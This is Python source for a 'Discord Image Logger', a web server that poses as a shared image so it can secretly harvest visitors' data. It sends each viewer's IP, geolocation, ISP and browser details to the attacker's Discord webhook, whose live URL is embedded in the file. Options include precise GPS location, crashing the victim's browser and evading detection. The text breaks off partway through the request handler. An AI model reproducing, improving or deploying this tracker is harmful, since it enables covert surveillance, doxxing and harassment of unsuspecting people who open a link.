# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1444772742263078984/uadY6D5j3mD2F2qv_9PTzIzae7zYs101LFO-K4l1TtscoWYeyw4Dq0vATEDJj7CmuWWU",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

